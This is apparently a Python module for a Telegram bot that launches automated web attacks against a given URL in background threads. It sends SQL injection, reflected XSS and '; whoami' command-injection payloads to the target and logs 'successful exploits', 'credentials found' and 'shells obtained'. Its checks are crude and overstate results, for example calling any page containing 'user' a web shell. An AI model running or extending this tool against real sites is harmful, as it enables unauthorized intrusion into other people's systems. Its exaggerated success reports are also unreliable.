import asyncio
import threading
from typing import Dict, List, Any, Optional, Callable
from attack_engine import AttackEngine
from comprehensive_scanner import ComprehensiveScanner
import time

class AsyncAttackHandler:
    """Asynchronous attack handler for Telegram bot to prevent freezing"""
    
    def __init__(self):
        self.active_attacks = {}
        self.attack_threads = {}
        
    async def start_attack_async(self, target_url: str, vulnerabilities: List[Dict], 
                                progress_callback: Optional[Callable] = None) -> str:
        """Start attack asynchronously and return attack ID"""
        
        attack_id = f"attack_{int(time.time())}"
        
        # Store attack info
        self.active_attacks[attack_id] = {
            'target_url': target_url,
            'vulnerabilities': vulnerabilities,
            'status': 'starting',
            'start_time': time.time(),
            'results': None,
            'progress_callback': progress_callback
        }
        
        # Start attack in background thread
        thread = threading.Thread(
            target=self._run_attack_sync,
            args=(attack_id, target_url, vulnerabilities, progress_callback),
            daemon=True
        )
        thread.start()
        self.attack_threads[attack_id] = thread
        
        return attack_id
    
    def _run_attack_sync(self, attack_id: str, target_url: str, vulnerabilities: List[Dict],
                        progress_callback: Optional[Callable] = None):
        """Run attack synchronously in background thread"""
        try:
            # Update status
            self.active_attacks[attack_id]['status'] = 'running'
            
            if progress_callback:
                progress_callback("🚀 Starting automated attack sequence...")
            
            # Initialize attack engine
            attack_engine = AttackEngine(target_url, vulnerabilities)
            
            if progress_callback:
                progress_callback("⚡ Attack engine initialized, launching exploits...")
            
            # Run attacks with simplified approach for faster execution
            results = self._run_fast_attacks(attack_engine, vulnerabilities, progress_callback)
            
            # Store results
            self.active_attacks[attack_id]['results'] = results
            self.active_attacks[attack_id]['status'] = 'completed'
            
            if progress_callback:
                total_attacks = results.get('total_attacks', 0)
                successful = results.get('successful_exploits', 0)
                progress_callback(f"✅ Attack completed! {successful}/{total_attacks} successful exploits")
            
        except Exception as e:
            self.active_attacks[attack_id]['status'] = 'failed'
            self.active_attacks[attack_id]['error'] = str(e)
            
            if progress_callback:
                progress_callback(f"❌ Attack failed: {str(e)}")
    
    def _run_fast_attacks(self, attack_engine: AttackEngine, vulnerabilities: List[Dict], 
                         progress_callback: Optional[Callable] = None) -> Dict[str, Any]:
        """Run fast, focused attacks"""
        
        results = {
            'total_attacks': 0,
            'successful_exploits': 0,
            'failed_exploits': 0,
            'console_output': [],
            'extracted_data': [],
            'credentials_found': [],
            'shells_obtained': [],
            'attack_details': []
        }
        
        # Focus on high-impact vulnerabilities
        high_impact_vulns = [v for v in vulnerabilities if v.get('severity') in ['Critical', 'High']]
        
        if progress_callback:
            progress_callback(f"🎯 Targeting {len(high_impact_vulns)} high-impact vulnerabilities...")
        
        processed = 0
        for vuln in high_impact_vulns[:10]:  # Limit to first 10 for speed
            processed += 1
            progress = int((processed / min(len(high_impact_vulns), 10)) * 80) + 10
            
            vuln_type = vuln.get('type', '').lower()
            results['total_attacks'] += 1
            
            if progress_callback:
                progress_callback(f"[{progress}%] Testing {vuln_type} at {vuln.get('location', 'unknown')[:50]}...")
            
            success = False
            
            # Fast SQL injection test
            if 'sql injection' in vuln_type:
                success = self._fast_sql_test(vuln, results)
            
            # Fast XSS test  
            elif 'xss' in vuln_type or 'cross-site scripting' in vuln_type:
                success = self._fast_xss_test(vuln, results)
            
            # Fast command injection test
            elif 'command injection' in vuln_type:
                success = self._fast_command_test(vuln, results)
            
            if success:
                results['successful_exploits'] += 1
                if progress_callback:
                    progress_callback(f"✅ Exploited {vuln_type} successfully!")
            else:
                results['failed_exploits'] += 1
        
        return results
    
    def _fast_sql_test(self, vuln: Dict, results: Dict) -> bool:
        """Fast SQL injection test"""
        try:
            location = vuln.get('location', '')
            if not location or '?' not in location:
                return False
            
            # Quick test payload
            test_url = location.replace('?', "?id=1' OR '1'='1-- ")
            
            import requests
            session = requests.Session()
            session.headers.update({'User-Agent': 'Security-Scanner/1.0'})
            
            response = session.get(test_url, timeout=3)
            
            # Check for SQL success indicators
            if any(indicator in response.text.lower() 
                   for indicator in ['mysql', 'error', 'warning', 'database']):
                
                results['extracted_data'].append(f"SQL injection confirmed at {location}")
                results['credentials_found'].append({
                    'type': 'SQL Injection',
                    'location': location,
                    'method': 'Union-based'
                })
                return True
                
        except Exception:
            pass
        
        return False
    
    def _fast_xss_test(self, vuln: Dict, results: Dict) -> bool:
        """Fast XSS test"""
        try:
            location = vuln.get('location', '')
            if not location:
                return False
            
            # Quick XSS payload
            payload = "<script>alert('XSS')</script>"
            test_url = f"{location}?q={payload}"
            
            import requests
            session = requests.Session()
            
            response = session.get(test_url, timeout=2)
            
            if payload in response.text:
                results['extracted_data'].append(f"XSS confirmed at {location}")
                return True
                
        except Exception:
            pass
        
        return False
    
    def _fast_command_test(self, vuln: Dict, results: Dict) -> bool:
        """Fast command injection test"""
        try:
            location = vuln.get('location', '')
            if not location:
                return False
            
            # Quick command payload
            payload = "; whoami"
            test_url = f"{location}?cmd={payload}"
            
            import requests
            session = requests.Session()
            
            response = session.get(test_url, timeout=3)
            
            # Check for command execution indicators
            if any(indicator in response.text.lower() 
                   for indicator in ['root', 'user', 'uid=', 'gid=']):
                
                results['extracted_data'].append(f"Command injection confirmed at {location}")
                results['shells_obtained'].append({
                    'type': 'Command Injection',
                    'location': location,
                    'access_method': 'Web Shell'
                })
                return True
                
        except Exception:
            pass
        
        return False
    
    def get_attack_status(self, attack_id: str) -> Optional[Dict]:
        """Get attack status and results"""
        return self.active_attacks.get(attack_id)
    
    def cancel_attack(self, attack_id: str) -> bool:
        """Cancel running attack"""
        if attack_id in self.active_attacks:
            self.active_attacks[attack_id]['status'] = 'cancelled'
            return True
        return False
    
    def cleanup_completed_attacks(self):
        """Clean up old completed attacks"""
        to_remove = []
        current_time = time.time()
        
        for attack_id, attack_info in self.active_attacks.items():
            # Remove attacks older than 1 hour
            if current_time - attack_info['start_time'] > 3600:
                to_remove.append(attack_id)
        
        for attack_id in to_remove:
            if attack_id in self.active_attacks:
                del self.active_attacks[attack_id]
            if attack_id in self.attack_threads:
                del self.attack_threads[attack_id]

# Global async attack handler
async_attack_handler = AsyncAttackHandler()